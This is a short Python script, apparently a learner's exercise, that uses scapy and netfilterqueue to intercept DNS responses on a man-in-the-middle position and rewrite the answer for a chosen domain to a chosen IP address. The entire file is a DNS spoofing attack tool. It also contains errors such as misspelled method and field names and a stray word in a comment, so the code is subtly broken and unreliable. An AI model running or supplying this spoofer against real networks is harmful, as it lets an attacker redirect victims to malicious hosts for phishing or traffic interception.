#!/usr/bin/env python
import scapy.all as scapy
import netfilterqueue

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())#wrap the payload in scapy IP layer
    if scapy_packet.haslayr(scapy.DNSRR): #to check if the packet is DNSrspond
        qname = scapy_packet[scapy.DNSQR].qname
        url = "Enter the dns URL "
        spoofIP = 'Enter the new IP of DNS/host'
        if url in qname:
            print('[+] Spoofing target Started ... ')
            answer = scapy.DNSRR(rrname=qname, rdate= spoofIP)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            
            #this to delete the validation of the packet
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].checksum
            del scapy_packet[scapy.UDP].checksum
            del scapy_packet[scapy.UDP].len

            #this will set the modify packt to the packet
            packet.set_payload(str(scapy_packet))

    packet.accept()#this method will accpet the packet then forward it.
    
queue = netfilterqueue.NetfilterQueue() #here I create instant of netfilterqueue and place it in var queue
queue.bind(0, process_packet) #this method will allows us to connect the created queue with the queue we enabled in linuxIPTables.ArithmeticError
queue.run() #to run the queue


